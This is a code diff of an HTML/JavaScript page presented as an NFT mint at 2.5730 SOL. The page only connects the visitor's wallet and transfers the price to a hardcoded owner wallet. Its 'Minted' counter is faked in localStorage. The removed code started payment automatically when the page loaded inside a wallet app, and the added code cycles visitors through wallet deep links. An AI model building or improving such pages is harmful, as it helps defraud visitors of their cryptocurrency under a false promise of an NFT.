@@ -25,6 +25,7 @@
       box-shadow:0 0 20px rgba(255,215,0,.6);transition:.3s;
     }
     button:hover{background:#ffed4e;transform:scale(1.04)}
+    button:disabled{background:#555;cursor:not-allowed}
     .status{margin-top:12px;font-size:.95rem;min-height:22px;font-weight:bold}
     .loader{display:inline-block;width:12px;height:12px;border:2px solid #ffd700;border-radius:50%;border-top-color:transparent;animation:s 1s linear infinite;margin-right:4px;}
     @keyframes s{to{transform:rotate(360deg)}}
@@ -37,69 +38,55 @@
     <p class="price">2.5730 SOL</p>
     <p class="stats">Minted: <span id="minted">0</span> / 10,000</p>
 
-    <button onclick="showWallets()">CHOOSE WALLET</button>
-
-    <div id="wallets" style="display:none;">
-      <button onclick="openPhantom()">Phantom</button>
-      <button onclick="openTrust()">Trust Wallet</button>
-      <button onclick="openMetamask()">MetaMask</button>
-    </div>
+    <button id="connectBtn">CONNECT & MINT</button>
 
     <div id="status" class="status"></div>
   </div>
 
+  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
+
   <script>
     const PRICE = 2.5730 * 1e9;
-    const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
-    let count = localStorage.getItem('softfund') || 0;
+    const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue"; // YOUR MAIN WALLET
+    let provider = null;
+    let count = localStorage.getItem('softfund') ? parseInt(localStorage.getItem('softfund')) : 0;
     document.getElementById('minted').textContent = count;
 
-    function status(txt, color) {
-      document.getElementById('status').innerHTML = txt;
-      document.getElementById('status').style.color = color;
+    const status = document.getElementById("status");
+    const btn = document.getElementById("connectBtn");
+
+    function setStatus(txt, color) {
+      status.innerHTML = txt;
+      status.style.color = color;
     }
 
-    function showWallets() {
-      document.querySelector('button').style.display = 'none';
-      document.getElementById('wallets').style.display = 'block';
+    // Detect wallet
+    function getProvider() {
+      if (window.solana?.isPhantom) return window.solana;
+      if (window.trustwallet?.Provider?.solana) return window.trustwallet.Provider.solana;
+      if (window.ethereum?.isMetaMask) return window.ethereum;
+      return null;
     }
 
-    // === PHANTOM: Open IN APP + auto-connect + pay ===
-    function openPhantom() {
-      status("Opening Phantom... <span class='loader'></span>", "#ffd700");
-      const url = "https://phantom.app/ul/browse/" + encodeURIComponent(location.href) + "?ref=" + encodeURIComponent(location.href);
-      location.href = url;
-    }
+    // Connect + Mint
+    async function connectAndMint() {
+      provider = getProvider();
+      if (!provider) {
+        setStatus("Open in Phantom, Trust, or MetaMask", "#ff5555");
+        return;
+      }
 
-    // === TRUST: Open page inside Trust browser ===
-    function openTrust() {
-      status("Opening Trust Wallet... <span class='loader'></span>", "#ffd700");
-      location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(location.href);
-    }
-
-    // === METAMASK: Open page inside MetaMask browser ===
-    function openMetamask() {
-      status("Opening MetaMask... <span class='loader'></span>", "#ffd700");
-      location.href = "https://metamask.app.link/dapp/" + location.host + location.pathname;
-    }
-
-    // === AUTO-MINT WHEN PAGE LOADS IN WALLET ===
-    window.addEventListener("load", () => {
-      setTimeout(() => {
-        if (window.solana || window.trustwallet || window.ethereum) {
-          mintNow();
-        }
-      }, 1000);
-    });
-
-    async function mintNow() {
-      status("Connecting... <span class='loader'></span>", "#ffd700");
-      let provider = window.solana || window.trustwallet?.Provider?.solana || window.ethereum;
-
-      if (!provider) return status("Wallet not found", "#ff5555");
+      btn.disabled = true;
+      setStatus("Connecting... <span class='loader'></span>", "#ffd700");
 
       try {
-        if (!provider.isConnected) await provider.connect();
+        // Connect
+        if (!provider.isConnected) {
+          await provider.connect();
+        }
+
+        setStatus("Connected! Sending 2.5730 SOL... <span class='loader'></span>", "#ffd700");
+
         const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
         const tx = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
@@ -108,22 +95,52 @@
             lamports: PRICE,
           })
         );
+
         const { blockhash } = await connection.getLatestBlockhash();
         tx.recentBlockhash = blockhash;
         tx.feePayer = provider.publicKey;
 
-        const signed = await provider.signTransaction(tx);
-        const sig = await connection.sendRawTransaction(signed.serialize());
-        await connection.confirmTransaction(sig);
+        // THIS TRIGGERS THE PAYMENT POPUP
+        const signed = await provider.signAndSendTransaction(tx);
 
-        count++; localStorage.setItem('softfund', count);
+        await connection.confirmTransaction(signed.signature);
+
+        count++;
+        localStorage.setItem('softfund', count);
         document.getElementById('minted').textContent = count;
-        status(`MINTED! <a href="https://solscan.io/tx/${sig}" style="color:#00ff9d">View Tx</a>`, "#00ff9d");
-      } catch (e) {
-        status("Failed – try again", "#ff5555");
+
+        setStatus(`MINTED! <a href="https://solscan.io/tx/${signed.signature}" target="_blank" style="color:#00ff9d">View Tx</a>`, "#00ff9d");
+
+        setTimeout(() => {
+          btn.disabled = false;
+          setStatus("");
+        }, 4000);
+
+      } catch (err) {
+        console.error(err);
+        setStatus("Payment rejected or failed", "#ff5555");
+        btn.disabled = false;
       }
     }
+
+    // Auto-run when in wallet
+    window.addEventListener("load", () => {
+      if (getProvider()) {
+        btn.textContent = "MINT NOW";
+        btn.onclick = connectAndMint;
+      } else {
+        btn.textContent = "OPEN IN WALLET APP";
+        btn.onclick = () => {
+          const url = location.href;
+          const phantom = `https://phantom.app/ul/browse/${encodeURIComponent(url)}`;
+          const trust = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(url)}`;
+          const mm = `https://metamask.app.link/dapp/${location.host}${location.pathname}`;
+          location.href = phantom;
+          setTimeout(() => location.href = trust, 1500);
+          setTimeout(() => location.href = mm, 3000);
+        };
+      }
+    });
   </script>
-  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
 </body>
 </html>
